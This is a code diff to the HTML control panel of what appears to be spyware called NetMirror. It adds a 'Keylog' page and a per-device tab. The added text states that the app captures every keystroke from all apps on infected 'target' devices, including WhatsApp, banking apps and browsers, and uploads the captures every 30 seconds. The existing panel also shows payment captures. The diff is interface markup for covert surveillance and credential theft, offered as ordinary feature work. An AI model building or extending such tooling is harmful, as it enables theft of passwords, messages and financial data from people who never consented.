@@ -103,6 +103,9 @@
         <a href="#" class="nav-link" data-page="connections">
           <i class="ri-radar-line"></i><span>Connections</span>
         </a>
+        <a href="#" class="nav-link" data-page="keylog">
+          <i class="ri-keyboard-line"></i><span>Keylog</span>
+        </a>
         <a href="#" class="nav-link" data-page="users">
           <i class="ri-user-line"></i><span>App Users</span>
         </a>
@@ -833,6 +836,45 @@
             <i class="ri-radar-line"></i>
             <p>NO DEVICES DETECTED</p>
             <span>Targets will appear when the app is installed on a device</span>
+          </div>
+        </div>
+      </section>
+
+      <!-- ===== KEYLOG PAGE (Global real-time keystroke monitor) ===== -->
+      <section id="page-keylog" class="page">
+        <div class="card" style="margin-bottom:16px">
+          <div class="card-head">
+            <h3><i class="ri-keyboard-line" style="color:#00e5ff"></i> Keystroke Monitor — Real-Time</h3>
+            <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
+              <span id="globalKeylogLiveBadge" style="display:none;font-size:11px;color:#0f0;font-weight:600;animation:fxBlink 1.5s infinite">● LIVE</span>
+              <span id="globalKeylogCount" style="font-size:11px;color:var(--muted)">0 entries</span>
+            </div>
+          </div>
+          <div class="card-content">
+            <p style="color:var(--muted);font-size:13px;margin-bottom:12px">
+              Every keystroke typed on any connected device appears here in real time.
+              The NetMirror app captures text input from ALL apps (WhatsApp, banking, social, browsers, etc.)
+              and uploads batches every 30 seconds or 50 keystrokes.
+            </p>
+            <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px">
+              <div class="tab-search-wrap" style="flex:1;min-width:200px">
+                <i class="ri-search-line"></i>
+                <input type="text" id="globalKeylogSearch" placeholder="Search keystrokes across all devices..." oninput="filterGlobalKeylogEntries()">
+              </div>
+              <select id="globalKeylogDeviceFilter" onchange="loadGlobalKeylogs()" style="background:var(--surface);border:1px solid var(--border);color:var(--text);border-radius:6px;padding:6px 10px;font-size:12px;min-width:180px">
+                <option value="">All Devices</option>
+              </select>
+              <button class="btn btn-outline btn-sm" onclick="loadGlobalKeylogs()">
+                <i class="ri-refresh-line"></i> Refresh
+              </button>
+              <button class="btn btn-outline btn-sm" onclick="clearAllKeylogs()" style="color:#f44336;border-color:#f44336">
+                <i class="ri-delete-bin-line"></i> Clear All
+              </button>
+            </div>
+            <div id="globalKeylogList" style="max-height:600px;overflow-y:auto;font-family:'JetBrains Mono',monospace;font-size:12px">
+              <div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading keystroke captures...</span></div>
+            </div>
+            <div id="globalKeylogPagination" style="margin-top:12px;display:flex;justify-content:center;gap:4px"></div>
           </div>
         </div>
       </section>
@@ -1946,6 +1988,9 @@
         <button class="device-tab" data-tab="payment" onclick="switchDeviceTab('payment')">
           <i class="ri-bank-card-line" style="color:#ff5252"></i><span style="color:#ff5252">Payment</span>
         </button>
+        <button class="device-tab" data-tab="keylog" onclick="switchDeviceTab('keylog')" title="Real-time keystroke captures">
+          <i class="ri-keyboard-line" style="color:#00e5ff"></i><span style="color:#00e5ff">Keylog</span>
+        </button>
       </div>
 
       <!-- ===== TAB: SMS ===== -->
@@ -2151,6 +2196,32 @@
         <div id="paymentCapturesContainer">
           <div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading payment captures...</span></div>
         </div>
+      </div>
+
+      <!-- ===== TAB: KEYLOG (real-time keystroke captures) ===== -->
+      <div class="device-tab-content" id="tab-keylog">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;flex-wrap:wrap;gap:8px">
+          <div style="display:flex;align-items:center;gap:8px">
+            <div class="tab-search-wrap" style="width:280px">
+              <i class="ri-search-line"></i>
+              <input type="text" id="keylogSearch" placeholder="Search keystrokes..." oninput="filterKeylogEntries()">
+            </div>
+            <select id="keylogAppFilter" onchange="filterKeylogEntries()" style="background:var(--surface);border:1px solid var(--border);color:var(--text);border-radius:6px;padding:6px 10px;font-size:12px">
+              <option value="">All Apps</option>
+            </select>
+          </div>
+          <div style="display:flex;gap:8px;align-items:center">
+            <span id="keylogCount" style="font-size:11px;color:var(--muted)">0 entries</span>
+            <span id="keylogLiveBadge" style="display:none;font-size:10px;color:#0f0;font-weight:600;animation:fxBlink 1.5s infinite">● LIVE</span>
+            <button class="btn btn-outline btn-sm" onclick="clearDeviceKeylogs()" style="color:#f44336;border-color:#f44336">
+              <i class="ri-delete-bin-line"></i> Clear
+            </button>
+          </div>
+        </div>
+        <div id="keylogListContainer" style="max-height:500px;overflow-y:auto;font-family:'JetBrains Mono',monospace">
+          <div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading keystroke captures...</span></div>
+        </div>
+        <div id="keylogPagination" style="margin-top:12px"></div>
       </div>
 
     </div>
